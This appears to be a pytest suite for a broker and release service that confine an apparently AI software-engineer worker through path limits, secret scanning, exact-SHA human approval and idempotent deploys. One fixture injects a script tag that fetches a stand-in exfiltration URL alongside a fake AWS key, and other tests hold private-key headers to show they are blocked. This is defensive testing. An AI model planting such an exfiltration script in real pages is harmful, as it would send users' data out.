from __future__ import annotations

import hashlib

import pytest

from broker.contracts import ArtifactCommitArgs, DraftArtifact, MutationRequest
from broker.service import BrokerDenied, create_software_engineer_broker
from gates.swe import SoftwareGateSuite
from gates.swe.release import ReleaseDenied, SoftwareReleaseService
from identity import ActorContext
from workers.swe import (
    InMemoryArtifactRepository,
    InMemoryDeploymentAdapter,
    SoftwareEngineerTask,
    SoftwareEngineerWorker,
    SoftwareReleaseApproval,
)

BASE_SHA = "1" * 64


def _task(**overrides: object) -> SoftwareEngineerTask:
    values = {
        "task_id": "swe-task-001",
        "brief_id": "brief-01",
        "submitted_by": "submitter-1",
        "release_approver": "approver-1",
        "sandbox_catalog": "demo_catalog",
        "sandbox_schema": "sandbox",
        "generated_prefix": "generated/software-engineer",
        "artifact_branch": "steward-forge/candidates",
        "trusted_base_sha": BASE_SHA,
        "dashboard_title": "Engineering delivery signals",
        "source_tables": (
            "demo_catalog.sandbox.steward_forge_brief_01_run_01__backlog",
            "demo_catalog.sandbox.steward_forge_brief_01_run_01__pipeline_runs",
            "demo_catalog.sandbox.steward_forge_brief_01_run_01__platform_costs",
        ),
        "request_genie": False,
        "genie_creation_verified": False,
        "genie_verification_id": None,
    }
    values.update(overrides)
    return SoftwareEngineerTask.model_validate(values)


def _service() -> tuple[
    SoftwareReleaseService, InMemoryArtifactRepository, InMemoryDeploymentAdapter
]:
    repository = InMemoryArtifactRepository(BASE_SHA)
    deployer = InMemoryDeploymentAdapter(
        previous_release_sha="0" * 64,
        previous_workspace_ids={"dashboard": "dashboard-previous"},
    )
    return SoftwareReleaseService(repository, deployer), repository, deployer


def _artifact(path: str, content: str = "safe content") -> DraftArtifact:
    return DraftArtifact(
        path=path,
        content=content,
        sha=hashlib.sha256(content.encode()).hexdigest(),
    )


def _broker(task: SoftwareEngineerTask, repository: InMemoryArtifactRepository):
    return create_software_engineer_broker(
        generated_prefix=task.generated_prefix,
        artifact_branch=task.artifact_branch,
        commit_executor=repository.commit,
    )


def _approver() -> ActorContext:
    return ActorContext(subject="approver-1", roles={"approver", "viewer"})


def test_worker_can_draft_but_has_no_direct_commit_or_push_capability() -> None:
    task = _task()
    worker = SoftwareEngineerWorker()
    candidate = worker.draft(task)

    assert {artifact.path.rsplit("/", 1)[-1] for artifact in candidate.artifacts} == {
        "dashboard.html",
        "dashboard.js",
        "dashboard.tests.json",
    }
    assert not hasattr(worker, "commit")
    assert not hasattr(worker, "push")
    request = worker.propose_candidate_commit(task, candidate)
    assert request.tool_id == "artifact.commit-candidate"
    assert request.worker_id == "software-engineer"
    assert request.contract_version == 1


def test_worker_read_scope_is_restricted_to_configured_sandbox() -> None:
    with pytest.raises(ValueError, match="configured sandbox"):
        _task(source_tables=("other_catalog.sandbox.table",))


@pytest.mark.parametrize(
    "path",
    [
        "generated/other/dashboard.html",
        "generated/software-engineer/.github/workflows/release.yml",
        "generated/software-engineer/platform/databricks.yml",
        "generated/software-engineer/platform.yml",
        "generated/software-engineer/infrastructure/cluster.yml",
        "generated/software-engineer/infrastructure.tf",
        "generated/software-engineer/secrets/token.txt",
        "generated/software-engineer/secret.env",
        "resources/app.yml",
    ],
)
def test_broker_rejects_non_generated_and_privileged_paths(path: str) -> None:
    task = _task()
    repository = InMemoryArtifactRepository(BASE_SHA)
    broker = _broker(task, repository)
    arguments = ArtifactCommitArgs(
        branch=task.artifact_branch,
        parent_sha=BASE_SHA,
        message="candidate",
        artifacts=(_artifact(path),),
    )
    request = MutationRequest(
        contract_id="software-engineer-artifact-writer",
        contract_version=1,
        worker_id="software-engineer",
        workflow_id=task.brief_id,
        tool_id="artifact.commit-candidate",
        arguments=arguments.model_dump(mode="json"),
        idempotency_key=f"denied:{path}",
    )

    with pytest.raises(BrokerDenied):
        broker.execute(request)
    assert broker.events[-1].outcome == "denied"
    assert repository.commit_calls == 0


def test_broker_rejects_secret_content_and_unconfigured_branch_before_commit() -> None:
    task = _task()
    repository = InMemoryArtifactRepository(BASE_SHA)
    broker = _broker(task, repository)
    worker = SoftwareEngineerWorker()
    candidate = worker.draft(task)
    secret = _artifact(
        candidate.artifacts[0].path,
        "access_" + "token=" + "synthetic-placeholder",
    )
    secret_candidate = candidate.model_copy(
        update={"artifacts": (secret, *candidate.artifacts[1:])}
    )
    secret_request = worker.propose_candidate_commit(task, secret_candidate)

    with pytest.raises(BrokerDenied, match="secret-like content"):
        broker.execute(secret_request)

    arguments = ArtifactCommitArgs.model_validate(secret_request.arguments).model_copy(
        update={"branch": "steward-forge/unconfigured"}
    )
    branch_request = secret_request.model_copy(
        update={
            "arguments": arguments.model_dump(mode="json"),
            "idempotency_key": "wrong-branch",
        }
    )
    with pytest.raises(BrokerDenied, match="candidate branch"):
        broker.execute(branch_request)
    assert repository.commit_calls == 0


@pytest.mark.parametrize("kind", ["RSA ", "EC ", "OPENSSH ", ""])
def test_broker_rejects_private_key_headers_before_commit(kind: str) -> None:
    task = _task()
    repository = InMemoryArtifactRepository(BASE_SHA)
    broker = _broker(task, repository)
    content = "-----BEGIN " + kind + "PRIVATE KEY-----"
    artifact = _artifact(f"{task.generated_prefix}/dashboard.html", content)
    arguments = ArtifactCommitArgs(
        branch=task.artifact_branch,
        parent_sha=BASE_SHA,
        message="candidate",
        artifacts=(artifact,),
    )
    request = MutationRequest(
        contract_id="software-engineer-artifact-writer",
        contract_version=1,
        worker_id="software-engineer",
        tool_id="artifact.commit-candidate",
        arguments=arguments.model_dump(mode="json"),
        idempotency_key=f"private-key-{kind}",
    )

    with pytest.raises(BrokerDenied, match="secret-like content"):
        broker.execute(request)
    assert repository.commit_calls == 0


def test_all_swe_gates_report_independently_without_executing_artifacts() -> None:
    task = _task()
    candidate = SoftwareEngineerWorker().draft(task)
    report = SoftwareGateSuite().evaluate(
        task, candidate, committed_artifacts=candidate.artifacts
    )

    assert report.passed is True
    assert report.results == {
        "unit": "passed",
        "integration": "passed",
        "quality": "passed",
        "policy": "passed",
        "secret": "passed",
        "harmful_diff": "passed",
    }

    hostile = _artifact(
        candidate.artifacts[0].path,
        '<script>fetch("https://example.invalid/exfiltrate")</script> '
        + "AKIA"
        + "1234567890ABCDEF",
    )
    compromised = candidate.model_copy(
        update={"artifacts": (hostile, *candidate.artifacts[1:])}
    )
    failed = SoftwareGateSuite().evaluate(
        task, compromised, committed_artifacts=compromised.artifacts
    )
    assert len(failed.checks) == 6
    assert failed.passed is False
    assert failed.results["secret"] == "failed"
    assert failed.results["harmful_diff"] == "failed"


def test_dashboard_is_primary_and_genie_requires_verified_creation() -> None:
    worker = SoftwareEngineerWorker()
    unverified = worker.draft(_task(request_genie=True))
    verified = worker.draft(
        _task(
            request_genie=True,
            genie_creation_verified=True,
            genie_verification_id="genie-probe-001",
        )
    )

    assert any(path.endswith("dashboard.html") for path in unverified.paths)
    assert not any(path.endswith("genie-space.json") for path in unverified.paths)
    assert any(path.endswith("genie-space.json") for path in verified.paths)


def test_prepare_replay_returns_the_original_broker_commit() -> None:
    service, repository, _ = _service()
    task = _task()

    first = service.prepare(task)
    replay = service.prepare(task)

    assert replay == first
    assert repository.commit_calls == 1


def test_sha_approval_is_exact_and_candidate_must_descend_from_trusted_base() -> None:
    service, repository, _ = _service()
    prepared = service.prepare(_task())

    with pytest.raises(ReleaseDenied, match="exact candidate SHA"):
        service.release(
            prepared,
            SoftwareReleaseApproval(
                decision_id="approval-other",
                decision="approved",
                approved_sha="2" * 64,
            ),
            _approver(),
            idempotency_key="deploy-other",
        )

    repository.detach_for_test(prepared.commit.commit_sha)
    with pytest.raises(ReleaseDenied, match="trusted base"):
        service.release(
            prepared,
            SoftwareReleaseApproval(
                decision_id="approval-detached",
                decision="approved",
                approved_sha=prepared.commit.commit_sha,
            ),
            _approver(),
            idempotency_key="deploy-detached",
        )


def test_release_requires_validated_named_approver_and_all_gates() -> None:
    service, _, deployer = _service()
    prepared = service.prepare(_task())
    approval = SoftwareReleaseApproval(
        decision_id="approval-identity",
        decision="approved",
        approved_sha=prepared.commit.commit_sha,
    )

    with pytest.raises(ReleaseDenied, match="named approver"):
        service.release(
            prepared,
            approval,
            ActorContext(subject="other-approver", roles={"approver"}),
            idempotency_key="wrong-actor",
        )
    sod_service, _, _ = _service()
    sod_prepared = sod_service.prepare(_task(release_approver="submitter-1"))
    sod_approval = approval.model_copy(
        update={"approved_sha": sod_prepared.commit.commit_sha}
    )
    with pytest.raises(ReleaseDenied, match="submitter cannot approve"):
        sod_service.release(
            sod_prepared,
            sod_approval,
            ActorContext(subject="submitter-1", roles={"approver"}),
            idempotency_key="same-actor",
        )

    failing_service, _, failing_deployer = _service()
    gate_failed = failing_service.prepare(_task(dashboard_title="fetch("))
    assert gate_failed.gates.passed is False
    failed_approval = approval.model_copy(
        update={"approved_sha": gate_failed.commit.commit_sha}
    )
    with pytest.raises(ReleaseDenied, match="every isolated gate"):
        failing_service.release(
            gate_failed,
            failed_approval,
            _approver(),
            idempotency_key="failed-gate",
        )
    assert deployer.deploy_calls == 0
    assert failing_deployer.deploy_calls == 0


def test_rejected_decision_id_cannot_be_reused_as_approved() -> None:
    service, _, deployer = _service()
    prepared = service.prepare(_task())
    rejected = SoftwareReleaseApproval(
        decision_id="approval-rejected",
        decision="rejected",
        approved_sha=prepared.commit.commit_sha,
    )

    with pytest.raises(ReleaseDenied, match="approval was rejected"):
        service.release(
            prepared,
            rejected,
            _approver(),
            idempotency_key="rejected-deploy",
        )
    with pytest.raises(ReleaseDenied, match="decision ID is bound"):
        service.release(
            prepared,
            rejected.model_copy(update={"decision": "approved"}),
            _approver(),
            idempotency_key="rejected-deploy",
        )
    assert deployer.deploy_calls == 0


def test_release_rejects_committed_bytes_that_differ_from_broker_receipt() -> None:
    service, repository, deployer = _service()
    prepared = service.prepare(_task())
    changed = _artifact(
        prepared.candidate.artifacts[0].path,
        "changed after the broker returned its commit receipt",
    )
    repository.replace_artifacts_for_test(
        prepared.commit.commit_sha,
        (changed, *prepared.candidate.artifacts[1:]),
    )
    approval = SoftwareReleaseApproval(
        decision_id="approval-readback",
        decision="approved",
        approved_sha=prepared.commit.commit_sha,
    )

    with pytest.raises(ReleaseDenied, match="committed artifact bytes"):
        service.release(
            prepared,
            approval,
            _approver(),
            idempotency_key="deploy-readback",
        )
    assert deployer.deploy_calls == 0


def test_integration_covers_candidate_broker_gate_approval_deploy_and_receipt() -> None:
    service, repository, deployer = _service()
    task = _task(
        request_genie=True,
        genie_creation_verified=True,
        genie_verification_id="genie-probe-001",
    )
    prepared = service.prepare(task)
    approval = SoftwareReleaseApproval(
        decision_id="approval-001",
        decision="approved",
        approved_sha=prepared.commit.commit_sha,
    )

    first = service.release(
        prepared, approval, _approver(), idempotency_key="deploy-001"
    )
    replay = service.release(
        prepared, approval, _approver(), idempotency_key="deploy-001"
    )

    assert prepared.commit.paths == prepared.candidate.paths
    assert prepared.gates.passed is True
    assert repository.commit_calls == 1
    assert first == replay
    assert deployer.deploy_calls == 1
    assert first.commit_sha == prepared.commit.commit_sha
    assert first.approval_id == approval.decision_id
    assert first.workspace_ids.keys() == {"deployment", "dashboard", "genie_space"}
    assert first.rollback_state == {
        "release_sha": "0" * 64,
        "workspace_ids": {"dashboard": "dashboard-previous"},
    }
    assert first.gate_results == prepared.gates.results
    assert first.broker_receipt_id == prepared.broker_receipt.receipt_id

    with pytest.raises(ReleaseDenied, match="release idempotency key"):
        service.release(
            prepared,
            approval.model_copy(update={"decision_id": "approval-002"}),
            _approver(),
            idempotency_key="deploy-001",
        )


def test_broker_commit_is_idempotent_and_worker_cannot_request_push() -> None:
    task = _task()
    repository = InMemoryArtifactRepository(BASE_SHA)
    broker = _broker(task, repository)
    worker = SoftwareEngineerWorker()
    candidate = worker.draft(task)
    request = worker.propose_candidate_commit(task, candidate)

    assert broker.execute(request) == broker.execute(request)
    assert repository.commit_calls == 1

    push = request.model_copy(
        update={"tool_id": "git.push", "idempotency_key": "push-attempt"}
    )
    with pytest.raises(BrokerDenied, match="tool is not allowed"):
        broker.execute(push)


def test_deployment_idempotency_key_cannot_change_commit() -> None:
    deployer = InMemoryDeploymentAdapter()
    deployer.deploy(
        commit_sha="3" * 64,
        include_genie=False,
        idempotency_key="deployment-key",
    )

    with pytest.raises(ValueError, match="another request"):
        deployer.deploy(
            commit_sha="4" * 64,
            include_genie=False,
            idempotency_key="deployment-key",
        )
    assert deployer.deploy_calls == 1
